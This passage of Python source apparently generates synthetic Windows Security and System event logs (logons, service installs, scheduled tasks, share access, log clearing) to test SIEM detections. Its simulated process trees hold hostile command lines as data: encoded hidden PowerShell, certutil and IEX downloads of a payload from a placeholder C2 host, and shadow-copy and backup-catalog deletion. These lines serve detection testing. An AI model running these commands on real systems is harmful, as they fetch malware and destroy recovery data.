                if attempt == 39:
                    raise
                time.sleep(0.025)
    _RECORD_RESERVED[host] = start + _RECORD_BLOCK
    return start


_RECORD_NUMBERS_HERMETIC: dict[str, int] = {}


def _in_hermetic_run():
    try:
        from modules.session_utils import hermetic
    except ImportError:
        from session_utils import hermetic
    return hermetic()


def _next_record_number(host: str) -> int:
    """Monotonic RecordNumber per host, across restarts and concurrent processes.

    Inside a deterministic Training Mode run (session_utils.hermetic()) numbering is the
    original seeded, in-memory scheme instead, so the same seed reproduces the same ids
    -- and the live, persistent counters are never touched by a training run."""
    if _deferring():                    # worker thread: the releaser assigns it later
        return _RID_PENDING + host
    if _in_hermetic_run():
        with _RECORD_LOCK:
            cur = _RECORD_NUMBERS_HERMETIC.get(host)
            if cur is None:
                cur = random.randint(50_000, 500_000)
            cur += 1
            _RECORD_NUMBERS_HERMETIC[host] = cur
            return cur
    with _RECORD_LOCK:
        cur = _RECORD_NUMBERS.get(host)
        if cur is None or cur >= _RECORD_RESERVED.get(host, -1):
            cur = _reserve_record_block(host, cur)
        cur += 1
        _RECORD_NUMBERS[host] = cur
        return cur


def _new_logon_id() -> str:
    """Produce a hex logon-id string like '0x3e7' / '0xa35fa'."""
    return "0x" + format(random.randint(0x10000, 0xFFFFFF), "x")


def _new_logon_guid() -> str:
    """UUID in the braced form Windows uses."""
    return "{" + str(uuid.uuid4()) + "}"


def _ticket_hash() -> str:
    """Base64(SHA-256) ticket hash, as the Jan-2025-CU 4768/4769 events log Request/ResponseTicketHash."""
    return base64.b64encode(hashlib.sha256(uuid.uuid4().bytes).digest()).decode()


def _format_logon_ip(ip, logon_type):
    """Format IpAddress the way real Windows 4624/4625 events do."""
    if logon_type not in (3, 10):
        if logon_type in (2, 7):
            return random.choice(["127.0.0.1", "::1"])
        return "-"
    if not ip or ip == "-":
        return "-"
    if ":" in str(ip):
        return ip
    return ip


def _iso_ts(t: float = None) -> str:
    """Windows-native ISO8601 timestamp with sub-microsecond precision."""
    if t is None:
        t = time.time()
    dt = datetime.fromtimestamp(t, tz=timezone.utc)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond:06d}000Z"


def _parse_iso_ts(s: str) -> float:
    """Inverse of _iso_ts (sub-microsecond digits dropped)."""
    dt = datetime.strptime(s[:26], "%Y-%m-%dT%H:%M:%S.%f").replace(tzinfo=timezone.utc)
    return dt.timestamp()


_ISO_TS_RE = re.compile(r"\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{9}Z")   # _iso_ts output


def _end_by_now(events, now=None):
    """Rebase a built sequence so its LAST event lands at or just before now.

    Multi-step generators start at time.time() and add random gaps (dwell, process
    lifetime, per-account pacing), so their tail used to carry a time_created minutes
    ahead of wall clock -- something no real WEC source ships, and which skews any
    time-windowed correlation. Every event shifts back by the same amount, so the gaps
    between them are unchanged. Sequences already ending in the past are left alone.
    """
    if not events:
        return events
    if not isinstance(events, list):                       # one record
        return _end_by_now([events], now)[0]
    now = now or time.time()
    recs = [json.loads(e) if isinstance(e, str) else e for e in events]
    times = [_parse_iso_ts(r["time_created"]) for r in recs if r.get("time_created")]
    if not times or max(times) <= now:
        return events
    delta = max(times) - now + random.uniform(0.2, 3.0)
    # Every timestamp the sequence generated moves with it -- time_created AND event-data
    # times rendered into the fields and message (PasswordLastSet on 4720/4741, ...), or
    # those would be left seconds ahead of the event that set them. Older values (account
    # creation dates, prior logons) predate the sequence and stay put.
    lo = min(times) - 1.0

    def shift(m):
        t = _parse_iso_ts(m.group(0))
        return _iso_ts(t - delta) if t >= lo else m.group(0)

    out = []
    for e, r in zip(events, recs):
        s = _ISO_TS_RE.sub(shift, json.dumps(r))
        out.append(s if isinstance(e, str) else json.loads(s))
    return out


def _ending_by_now(fn):
    """Wrap a (config, session_context) generator so its output passes _end_by_now.
    Applied to every entry of _BENIGN_GENERATORS / _THREAT_GENERATORS and to the
    scenario dispatch, so no current or future generator can ship future events."""
    @functools.wraps(fn)
    def run(config, session_context):
        return _end_by_now(fn(config, session_context))
    return run


# Configuration helpers

def _cf(config):
    """Shorthand — read this module's block from config.json with safe defaults."""
    return config.get(CONFIG_KEY, {}) or {}


def _get_domain(config):
    return _cf(config).get("domain_name", "EXAMPLECORP")


def _get_dns_domain(config):
    return _cf(config).get("dns_domain", "examplecorp.local")


def _get_dc_hostname(config):
    """Synthetic DC hostname used for DC-originated events (4740/4768/4769/4771/4776)."""
    return _cf(config).get("domain_controller_hostname", "DC01.examplecorp.local")


def _get_dc_short(config):
    return _get_dc_hostname(config).split(".")[0].upper()


def _domain_dn(config):
    """Base distinguished name for the simulated AD domain (DC=corp,DC=local)."""
    return ",".join(f"DC={p}" for p in _get_dns_domain(config).split("."))


def _fqdn(hostname, config):
    """Ensure a hostname is fully qualified — real Windows events always use FQDNs."""
    if "." in hostname:
        return hostname
    return f"{hostname}.{_get_dns_domain(config)}"


def _get_os_subtype(config):
    return _cf(config).get("os_subtype", "Windows 10")


def _get_windows_users(session_context):
    """Filter session_context down to users whose primary device is Windows.

    Returns a list of user_info dicts (from get_user_by_name) whose os_type is
    "Windows".  This is the authoritative population this module operates on.
    """
    if not session_context:
        return []
    windows_users = []
    for uname, prof in session_context.items():
        if (prof.get("primary_os_type") or "").lower() == "windows":
            info = get_user_by_name(session_context, uname)
            if info and info.get("hostname"):
                windows_users.append(info)
    return windows_users


def _pick_windows_user(session_context):
    """Return a random user_info for a user with a Windows primary device."""
    users = _get_windows_users(session_context)
    return random.choice(users) if users else None


def _get_threat_interval(threat_level, config):
    if threat_level == "Benign Traffic Only":
        return 86400 * 365
    levels = config.get("threat_generation_levels", {})
    return levels.get(threat_level, 7200)


# Core event-record builder

def _build_event(event_id: int, computer: str, event_data: dict,
                 success: bool = True,
                 ts: float = None) -> dict:
    """Construct a record matching the microsoft_windows_raw dataset schema.

    Outputs all fields present in the dataset schema so that XSIAM modeling
    rules, correlation rules, and UEBA analytics can process the events the
    same way they process real XDR-agent or WEC-collected events.

    The _collector_* and _insert_time fields are populated by the HTTP
    collector infrastructure automatically — we don't need to supply those.
    """
    meta = _EVENT_META[event_id]
    if ts is None:
        ts = time.time()

    kw = _KW_AUDIT_SUCCESS if success else _KW_AUDIT_FAILURE

    ts_str = _iso_ts(ts)

    message = _format_message(event_id, event_data)

    ed_clean = {k: v for k, v in event_data.items() if v is not None}

    # LSASS has one PID for the life of the boot; only the thread varies. Per HOST,
    # though -- see _lsass_pid.
    _pid_hex, proc_pid = _lsass_pid(computer)      # stable: LSASS wrote this record
    proc_tid = str(random.randint(500, 15000))     # varies: LSASS is multithreaded

    # Keep the invariant the original global pin existed to guarantee: when the
    # logon-requesting process in EventData IS lsass, its ProcessId must be the same
    # PID this record reports in <Execution ProcessID>, and one PID must never name
    # two executables. Enforced here, the single place that knows both the host and
    # the event data, rather than at each of the three tables that emit an lsass PID.
    _pname = str(ed_clean.get("ProcessName", ""))
    if _pname.lower().endswith("lsass.exe") and ed_clean.get("ProcessId"):
        ed_clean["ProcessId"] = _pid_hex

    # The process that generates Security Auditing events is lsass.exe
    lsass_path = "C:\\Windows\\System32\\lsass.exe"
    lsass_name = "lsass.exe"

    record = {
        # --- Fields matching the microsoft_windows_raw dataset schema ---
        "event_id":          str(event_id),
        "provider_name":     _PROVIDER_NAME,
        "provider_guid":     _PROVIDER_GUID,
        "channel":           _CHANNEL,
        "computer_name":     computer,
        "host_name":         computer,
        "time_created":      ts_str,
        "message":           message,
        "keywords":          kw,
        "log_level":         "Information",
        "event_result":      "success" if success else "failure",
        "event_action":      meta["category"],
        "task":              meta["task"],
        "opcode":            "Info",
        "op_code":           "0",
        "version":           str(meta["version"]),
        "os_subtype":        _BUILD_EVENT_OS_SUBTYPE,
        "record_id":         str(_next_record_number(computer)),
        "activity_id":       "",
        "process_pid":       proc_pid,
        "process_thread_id": proc_tid,
        "process_name":      lsass_name,
        "process_path":      lsass_path,
        "process_cmd":       "",
        "process_md5":       "",
        "process_sha256":    "",
        "event_data":        ed_clean,
        "user": {
            "name":       ed_clean.get("SubjectUserName", ""),
            "domain":     ed_clean.get("SubjectDomainName", ""),
            "identifier": ed_clean.get("SubjectUserSid", ""),
            "type":       _user_type(ed_clean.get("SubjectUserSid", ""),
                                     ed_clean.get("SubjectUserName", "")),
        },
        "user_data": {
            "SubjectDomainName": ed_clean.get("SubjectDomainName", ""),
            "SubjectUserName":   ed_clean.get("SubjectUserName", ""),
        },
    }

    return record


def _user_type(sid: str, username: str = "") -> str:
    """Derive user type from SID/username for the top-level 'user' object."""
    if username.endswith("$"):
        return "Computer"
    if sid in (_SID_SYSTEM, "S-1-5-18", "S-1-5-19", "S-1-5-20"):
        return "Service"
    return "User"


# Windows Event XML renderer (for WEC transport)

_EVENT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def _render_event_xml(event: dict) -> str:
    """Render a _build_event() dict as native Windows Event XML.

    Produces the <Event> XML that WEC/WEF natively transports and that
    XSIAM's microsoft_windows_raw parser ingests.  Requires lxml for
    proper namespace prefix control.
    """
    if not _HAS_LXML:
        raise RuntimeError(
            "lxml is required for WEC transport. Install with: pip install lxml"
        )

    E = _etree.Element
    SE = _etree.SubElement

    root = E("Event", xmlns=_EVENT_NS)

    # -- <System> --
    system = SE(root, "System")

    provider = SE(system, "Provider")
    provider.set("Name", event.get("provider_name", ""))
    provider.set("Guid", event.get("provider_guid", ""))

    eid_el = SE(system, "EventID")
    eid_el.text = str(event.get("event_id", "0"))
    # Classic (pre-Crimson) providers such as the Service Control Manager carry the
    # high word of the message ID as Qualifiers (7045: Qualifiers='16384').
    if event.get("event_qualifiers"):
        eid_el.set("Qualifiers", str(event["event_qualifiers"]))
    SE(system, "Version").text = str(event.get("version", "0"))

    # Level: 0 for audit events (both success and failure). Non-Security channels
    # (e.g. PowerShell/Operational 4104 = Verbose, 5) pass their own "level_num".
    SE(system, "Level").text = str(event.get("level_num", "0"))

    SE(system, "Task").text = str(event.get("task", "0"))
    SE(system, "Opcode").text = str(event.get("op_code", "0"))

    kw = event.get("keywords", _KW_AUDIT_SUCCESS)
    SE(system, "Keywords").text = kw

    tc = SE(system, "TimeCreated")
    tc.set("SystemTime", event.get("time_created", ""))

    SE(system, "EventRecordID").text = str(event.get("record_id", "0"))

    corr = SE(system, "Correlation")
    activity = event.get("activity_id", "")
    if activity:
        corr.set("ActivityID", activity)

    exe = SE(system, "Execution")
    exe.set("ProcessID", str(event.get("process_pid", "0")))
    exe.set("ThreadID", str(event.get("process_thread_id", "0")))

    SE(system, "Channel").text = event.get("channel", "Security")
    SE(system, "Computer").text = event.get("computer_name", "")
    # Security-channel audit events carry no UserID here on real Windows (the user is in
    # EventData), so the element stays empty by default. Operational channels such as
    # PowerShell/Operational 4104 do record the running user's SID; a record supplies it
    # as "security_user_id".
    sec = SE(system, "Security")
    if event.get("security_user_id"):
        sec.set("UserID", str(event["security_user_id"]))

    # -- <EventData> --
    ed = event.get("event_data", {})
    if ed:
        event_data_el = SE(root, "EventData")
        for name, value in ed.items():
            data_el = SE(event_data_el, "Data")
            data_el.set("Name", name)
            data_el.text = str(value) if value is not None else ""

    # -- <RenderingInfo> --
    msg = event.get("message", "").replace("\r\n", "\n")
    if msg:
        ri = SE(root, "RenderingInfo")
        ri.set("Culture", "en-US")
        SE(ri, "Message").text = msg
        SE(ri, "Level").text = event.get("log_level", "Information")
        SE(ri, "Task").text = event.get("event_action", "")
        SE(ri, "Opcode").text = event.get("opcode", "Info")
        SE(ri, "Channel").text = event.get("channel", "Security")
        SE(ri, "Provider").text = event.get("rendering_provider",
                                            "Microsoft Windows security auditing.")
        kw_el = SE(ri, "Keywords")
        # Security events are audit success/failure; other channels (PowerShell) carry
        # no audit keyword, signalled by "rendering_keyword": None.
        kw_text = event.get("rendering_keyword",
                            "Audit Success" if event.get("event_result") == "success"
                            else "Audit Failure")
        if kw_text:
            SE(kw_el, "Keyword").text = kw_text

    xml_str = _etree.tostring(root, encoding="unicode", xml_declaration=False)
    xml_str = re.sub(r'="([^"]*)"', lambda m: "='" + m.group(1) + "'", xml_str)
    return xml_str


def cribl_record(payload):
    """One event as the Cribl receiver gets it: the <Event> XML a Cribl WEF source carries
    (the Cortex docs require XML event format), the same bytes WEC delivers. Already
    rendered XML passes through."""
    if isinstance(payload, str):
        if payload.lstrip().startswith("<"):
            return payload
        payload = json.loads(payload)
    return _render_event_xml(payload)


# Per-EventID constructors

def _build_4624(user_info, config, *, logon_type=2, auth_pkg=None,
                workstation_override=None, ip_override=None,
                target_logon_id=None, logon_guid=None, ts=None,
                elevated=False, domain_override=None,
                target_sid_override=None) -> dict:
    """4624 – An account was successfully logged on (emitted by the endpoint).

    `domain_override`: TargetDomainName to use instead of the config AD domain.
    For a LOCAL (non-domain) box account, the logon "domain" is the computer's own
    name — pass it so the synthetic identity matches how XSIAM resolves that local
    account (netbios = the host), which the IP<->user binding needs to line up with
    the endpoint case.

    `target_sid_override`: TargetUserSid to emit instead of the hash-derived
    domain SID. Needed when the logon is a *machine-local* account (e.g. the
    built-in Administrator, S-1-5-21-<machine>-500) rather than a domain user."""
    domain = domain_override or _get_domain(config)
    computer = _fqdn(workstation_override or user_info["hostname"], config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "-"
    port = str(random.randint(49152, 65535))

    if auth_pkg is None:
        # LogonType 2/7/11/12/13 → Negotiate (Kerberos or NTLM fallback)
        # LogonType 3/10 → mostly Kerberos, occasionally NTLM
        if logon_type in (2, 7, 11, 13):
            auth_pkg = _NEG_PACKAGE
        elif logon_type in (3, 10):
            auth_pkg = random.choice([_KRB_PACKAGE, _KRB_PACKAGE, _KRB_PACKAGE, _NTLM_PACKAGE_SHORT])
        else:
            auth_pkg = _NEG_PACKAGE

    if auth_pkg == _NTLM_PACKAGE_SHORT:
        lm_pkg = random.choice(["NTLM V2", "NTLM V1"])
        key_len = random.choice(["128", "0"])
    else:
        lm_pkg = "-"
        key_len = "0"

    _lt_cat = {2: "interactive", 3: "network", 4: "service", 5: "service",
               7: "unlock", 10: "remote", 11: "cached",
               12: "remote", 13: "cached"}.get(logon_type, "interactive")

    if auth_pkg == _KRB_PACKAGE:
        lp_name = "Kerberos"
    elif auth_pkg == _NTLM_PACKAGE_SHORT:
        lp_name = "NtLmSsp "
    elif auth_pkg == _NEG_PACKAGE:
        lp_name = random.choice(["User32 ", "Advapi  ", "Negotiate"])
    else:
        lp_name = random.choice(_LOGON_PROCESS_NAMES.get(_lt_cat, ["User32"]))
    proc_id, proc_name = random.choice(
        _LOGON_PROCESSES_BY_TYPE.get(_lt_cat, _LOGON_PROCESSES_DEFAULT))

    target_logon_id = target_logon_id or _new_logon_id()
    logon_guid = logon_guid or _new_logon_guid()

    # Subject context depends on logon type:
    #   Type 3/10 (network/remote): NULL SID, empty name — auth hasn't bound a
    #     local identity yet, the Subject fields reflect the anonymous listener.
    #   All others (interactive/service/unlock/batch): SYSTEM / machine$ — the
    #     local system brokered the logon on behalf of the arriving user.
    if logon_type in (3, 10):
        subj_sid = _SID_ANON
        subj_name = "-"
        subj_domain = "-"
    else:
        subj_sid = _SID_SYSTEM
        subj_name = computer.split(".")[0].upper() + "$"
        subj_domain = domain

    if logon_type in (3, 10) and auth_pkg == _KRB_PACKAGE:
        _wks_name = "-"
    elif logon_type in (2, 3, 7, 10, 11):
        _wks_name = computer.split(".")[0].upper()
    else:
        _wks_name = "-"

    event_data = {
        "SubjectUserSid":            subj_sid,
        "SubjectUserName":           subj_name,
        "SubjectDomainName":         subj_domain,
        "SubjectLogonId":            "0x0" if logon_type in (3, 10) else "0x3e7",
        "TargetUserSid":             target_sid_override or _stable_user_sid(user_info["username"]),
        "TargetUserName":            user_info["username"],
        "TargetDomainName":          domain,
        "TargetLogonId":             target_logon_id,
        "LogonType":                 str(logon_type),
        "LogonProcessName":          lp_name,
        "AuthenticationPackageName": auth_pkg,
        "WorkstationName":           _wks_name,
        "LogonGuid":                 logon_guid if auth_pkg == _KRB_PACKAGE else "{00000000-0000-0000-0000-000000000000}",
        "TransmittedServices":       "-",
        "LmPackageName":             lm_pkg,
        "KeyLength":                 key_len,
        "ProcessId":                 proc_id,
        "ProcessName":               proc_name,
        "IpAddress":                 _format_logon_ip(ip, logon_type),
        "IpPort":                    port if logon_type in (3, 10) else ("0" if logon_type in (2, 7, 11) else "-"),
        "ImpersonationLevel":        "%%1833",
        "RestrictedAdminMode":       ("Yes" if random.random() < 0.1 else "-") if logon_type == 10 else "-",
        "TargetOutboundUserName":    "-",
        "TargetOutboundDomainName":  "-",
        "VirtualAccount":            "%%1843",   # "No"
        "TargetLinkedLogonId":       _new_logon_id() if elevated else "0x0",
        "ElevatedToken":             "%%1842" if elevated else "%%1843",  # Yes / No
    }

    # Remember open session so logoff emitters can correlate
    with _STATE_LOCK:
        _OPEN_SESSIONS.setdefault(computer, []).append({
            "logon_id":       target_logon_id,
            "target_user_sid": event_data["TargetUserSid"],
            "target_user_name": event_data["TargetUserName"],
            "target_domain": domain,
            "logon_type":    logon_type,
            "ip":            ip,
            "computer":      computer,
            "workstation":   event_data["WorkstationName"],
            "start":         ts or time.time(),
            "auth_package":  auth_pkg,
            "logon_guid":    logon_guid,
        })
        # a success clears the failure streak
        _FAIL_COUNTS[user_info["username"]] = 0

    return _build_event(
        4624, computer, event_data, success=True, ts=ts,
    )


_IMPLANT_SERVICE_NAMES = [
    "WindowsUpdaterSvc", "NetSvcHost", "WinDefendHelper", "SysMonitorSvc",
    "MsEdgeUpdateX", "TelemetrySyncSvc", "AudioSrvHost", "WdiServiceHostX",
]
_IMPLANT_SERVICE_FILES = [
    "C:\\Windows\\Temp\\{n}.exe",
    "C:\\ProgramData\\{n}\\svc.exe",
    "C:\\Users\\Public\\{n}.exe",
    "%COMSPEC% /c powershell.exe -nop -w hidden -enc SQBFAFgAKA...",
    "C:\\Windows\\System32\\{n}.exe",
]


def _build_4697(config, *, computer, actor_user=None, actor_sid=None,
                service_name=None, service_file=None, service_account=None,
                start_type=None, ts=None) -> dict:
    """4697 – A service was installed in the system (Security channel).

    Emitted on the host where the service is registered by the SCM. Used to
    model malware/implant persistence via a newly installed service. The
    Subject is the account that installed it — SYSTEM for an SCM-brokered
    install after the attacker already holds SeCreateServicePrivilege.
    """
    domain = _get_domain(config)
    comp = _fqdn(computer, config)
    if actor_sid is None:
        actor_sid = _SID_SYSTEM
        actor_user = comp.split(".")[0].upper() + "$"
    svc_name = service_name or random.choice(_IMPLANT_SERVICE_NAMES)
    svc_file = service_file or random.choice(_IMPLANT_SERVICE_FILES).replace("{n}", svc_name)
    event_data = {
        "SubjectUserSid":    actor_sid,
        "SubjectUserName":   actor_user,
        "SubjectDomainName": domain,
        "SubjectLogonId":    "0x3e7",
        "ServiceName":       svc_name,
        "ServiceFileName":   svc_file,
        "ServiceType":       "0x10",   # SERVICE_WIN32_OWN_PROCESS
        "ServiceStartType":  str(start_type if start_type is not None else 2),  # 2 = Auto start (persistence)
        "ServiceAccount":    service_account or "LocalSystem",
    }
    return _build_event(4697, comp, event_data, success=True, ts=ts)


# 7045 is written by the Service Control Manager to the SYSTEM channel, not by LSASS to
# Security, so it is built here as its own record (like the PowerShell 4104) rather than
# through _build_event. It pairs with the Security-channel 4697 for the same install; a
# WEC subscription that collects only Security sees the 4697 alone.
_SCM_PROVIDER = "Service Control Manager"
_SCM_GUID     = "{555908d1-a6d7-4695-8e1e-26931d2012f4}"
_SCM_START_TYPES = {2: "auto start", 3: "demand start", 4: "disabled"}


def _services_pid(computer):
    """services.exe PID for a host -- stable for the boot, like _lsass_pid."""
    h = int(hashlib.md5(("services:" + computer.lower()).encode()).hexdigest()[:6], 16)
    return str(600 + (h % 300) * 4)


def _build_7045(config, *, computer, service_name, image_path, start_type=3,
                account="LocalSystem", installer_sid=None, ts=None) -> dict:
    """7045 – A service was installed in the system (System channel, SCM)."""
    ts = ts if ts is not None else time.time()
    comp = _fqdn(computer, config)
    return {
        "event_id": "7045", "event_qualifiers": "16384",
        "provider_name": _SCM_PROVIDER, "provider_guid": _SCM_GUID,
        "channel": "System", "computer_name": comp, "host_name": comp,
        "time_created": _iso_ts(ts),
        "message": _msg_7045({"ServiceName": service_name, "ImagePath": image_path,
                              "ServiceType": "user mode service",
                              "StartType": _SCM_START_TYPES.get(start_type, "demand start"),
                              "AccountName": account}),
        "keywords": "0x8080000000000000", "level_num": "4", "log_level": "Information",
        "rendering_provider": _SCM_PROVIDER, "rendering_keyword": "Classic",
        "event_result": "success", "event_action": "None",
        "task": "0", "opcode": "Info", "op_code": "0", "version": "0",
        "os_subtype": _BUILD_EVENT_OS_SUBTYPE,
        "record_id": str(_next_record_number(comp + "|System")),
        "activity_id": "",
        "process_pid": _services_pid(comp),
        "process_thread_id": str(random.randint(500, 15000)),
        "process_name": "services.exe",
        "process_path": r"C:\Windows\System32\services.exe",
        "security_user_id": installer_sid or _SID_SYSTEM,
        "event_data": {"ServiceName": service_name, "ImagePath": image_path,
                       "ServiceType": "user mode service",
                       "StartType": _SCM_START_TYPES.get(start_type, "demand start"),
                       "AccountName": account},
    }


def _build_4698(user_info, config, *, computer=None, task_name, command, arguments="",
                author=None, run_as="S-1-5-18", hidden=False, trigger="boot",
                logon_id=None, ts=None) -> dict:
    """4698 – A scheduled task was created (Security channel).

    TaskContent is the task's registration XML, which is what detections read the
    action (Command/Arguments), principal (RunAs), Hidden flag and author from."""
    domain = _get_domain(config)
    comp = _fqdn(computer or user_info["hostname"], config)
    author = author or f"{domain}\\{user_info['username']}"
    ts_val = ts if ts is not None else time.time()
    when = datetime.fromtimestamp(ts_val, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
    trig = {
        "boot":  "<BootTrigger><Enabled>true</Enabled></BootTrigger>",
        "logon": "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>",
        "daily": (f"<CalendarTrigger><StartBoundary>{when}</StartBoundary><Enabled>true</Enabled>"
                  "<ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger>"),
        "once":  f"<TimeTrigger><StartBoundary>{when}</StartBoundary><Enabled>true</Enabled></TimeTrigger>",
    }[trigger]
    # TaskContent is the task's XML, so its text values are XML-escaped (a redirect '>'
    # in the arguments is logged as '&gt;').
    author, command, arguments = (_xml_escape(author), _xml_escape(command),
                                  _xml_escape(arguments))
    args_el = f"<Arguments>{arguments}</Arguments>" if arguments else ""
    content = (
        '<?xml version="1.0" encoding="UTF-16"?>\r\n'
        '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\r\n'
        f"  <RegistrationInfo>\r\n    <Date>{when}</Date>\r\n    <Author>{author}</Author>\r\n"
        f"    <URI>{task_name}</URI>\r\n  </RegistrationInfo>\r\n"
        f"  <Triggers>\r\n    {trig}\r\n  </Triggers>\r\n"
        f'  <Principals>\r\n    <Principal id="Author">\r\n      <UserId>{run_as}</UserId>\r\n'
        "      <RunLevel>HighestAvailable</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n"
        f"  <Settings>\r\n    <Enabled>true</Enabled>\r\n    <Hidden>{'true' if hidden else 'false'}</Hidden>\r\n"
        "  </Settings>\r\n"
        f'  <Actions Context="Author">\r\n    <Exec>\r\n      <Command>{command}</Command>\r\n'
        f"      {args_el}\r\n    </Exec>\r\n  </Actions>\r\n</Task>"
    )
    # A machine-account subject (HOST$) is the SYSTEM context of an elevated installer.
    is_machine = user_info["username"].endswith("$")
    event_data = {
        "SubjectUserSid":        _SID_SYSTEM if is_machine else _stable_user_sid(user_info["username"]),
        "SubjectUserName":       user_info["username"],
        "SubjectDomainName":     domain,
        "SubjectLogonId":        logon_id or _new_logon_id(),
        "TaskName":              task_name,
        "TaskContent":           content,
        "ClientProcessStartKey": str(random.randint(10**15, 10**16 - 1)),
        "ClientProcessId":       str(random.randint(1000, 30000)),
        "ParentProcessId":       str(random.randint(600, 1200)),
        "RpcCallClientLocality": "0",
        "FQDN":                  comp,
    }
    return _build_event(4698, comp, event_data, success=True, ts=ts)


def _build_5140(user_info, config, *, computer, share_name, share_path,
                ip=None, logon_id=None, access_mask="0x1", ts=None) -> dict:
    """5140 – A network share object was accessed (logged on the SERVER, once per
    session per share). ShareName is the UNC form '\\\\*\\NAME'."""
    domain = _get_domain(config)
    comp = _fqdn(computer, config)
    event_data = {
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "ObjectType":        "File",
        "IpAddress":         ip or user_info.get("ip") or "-",
        "IpPort":            str(random.randint(49152, 65535)),
        "ShareName":         share_name,
        "ShareLocalPath":    share_path,
        "AccessMask":        access_mask,
        "AccessList":        "%%4416\r\n\t\t\t\t",
    }
    return _build_event(5140, comp, event_data, success=True, ts=ts)


# 5145 access masks / access lists for the operations detections distinguish.
_5145_READ  = ("0x120089", "%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4423\r\n\t\t\t\t")
_5145_WRITE = ("0x2",      "%%4417\r\n\t\t\t\t")
_5145_PIPE  = ("0x12019f", "%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t"
                           "%%4418\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t")


def _build_5145(user_info, config, *, computer, share_name, share_path,
                relative_target, access=_5145_READ, ip=None, logon_id=None,
                ts=None) -> dict:
    """5145 – A network share object was checked to see whether client can be
    granted desired access (Detailed File Share; one per file/pipe touched)."""
    domain = _get_domain(config)
    comp = _fqdn(computer, config)
    mask, alist = access
    event_data = {
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "ObjectType":         "File",
        "IpAddress":          ip or user_info.get("ip") or "-",
        "IpPort":             str(random.randint(49152, 65535)),
        "ShareName":          share_name,
        "ShareLocalPath":     share_path,
        "RelativeTargetName": relative_target,
        "AccessMask":         mask,
        "AccessList":         alist,
        "AccessReason":       "-",
    }
    return _build_event(5145, comp, event_data, success=True, ts=ts)


def _build_1102(user_info, config, *, ts=None) -> dict:
    """1102 – The audit log was cleared (anti-forensics finale)."""
    domain = _get_domain(config)
    comp = _fqdn(user_info["hostname"], config)
    event_data = {
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    "0x%x" % random.randint(0x100000, 0x9fffff),
    }
    # Keep the default Security-Auditing provider so XSIAM models xdm.event.id=1102
    # the same way it does other Security-channel events (the Eventlog provider sends it
    # down a different modeling path where event.id doesn't resolve). Detectability > the
    # cosmetic provider name for a test harness.
    return _build_event(1102, comp, event_data, success=True, ts=ts)


# A realistic phishing→execution process tree: Office spawns hidden PowerShell, which
# drops to cmd and runs a living-off-the-land binary. Each stage's parent is the prior
# stage, so XSIAM process analytics see a coherent tree, not isolated 4688s.
_PROCESS_TREES = [
    [  # Office macro → encoded PowerShell downloader → certutil payload fetch
        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "\"WINWORD.EXE\" /n \"C:\\Users\\{u}\\Downloads\\Invoice_scan.doc\"",
         "C:\\Windows\\explorer.exe"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACA...",
         "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c certutil -urlcache -split -f http://{c2}/beacon.exe %TEMP%\\svchost.exe",
         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        ("C:\\Windows\\System32\\certutil.exe",
         "certutil -urlcache -split -f http://{c2}/beacon.exe %TEMP%\\svchost.exe",
         "C:\\Windows\\System32\\cmd.exe"),
    ],
    [  # Ransomware pre-encryption: PowerShell → vssadmin shadow delete + wbadmin
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{c2}/x')\"",
         "C:\\Windows\\explorer.exe"),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c vssadmin.exe delete shadows /all /quiet",
         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        ("C:\\Windows\\System32\\vssadmin.exe",
         "vssadmin.exe delete shadows /all /quiet",
         "C:\\Windows\\System32\\cmd.exe"),
        ("C:\\Windows\\System32\\wbadmin.exe",
         "wbadmin.exe delete catalog -quiet",
         "C:\\Windows\\System32\\cmd.exe"),
    ],
]


def _build_process_tree(user_info, config, c2_ip=None, ts=None) -> list:
    """Return a list of linked 4688 JSON records forming a realistic execution tree."""
    tree = random.choice(_PROCESS_TREES)
    c2 = c2_ip or f"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    base = ts or time.time()
    out = []
    for i, (proc, cmd, parent) in enumerate(tree):
        cmd_f = cmd.replace("{u}", user_info["username"].split("\\")[-1]).replace("{c2}", c2)
        out.append(json.dumps(_build_4688(
            user_info, config, process_name=proc, command_line=cmd_f,
            parent_process=parent, ts=base + i)))
    return out


def _build_4625(user_info, config, *, logon_type=3, auth_pkg=None,
                sub_status=None, status=None, failure_reason=None,
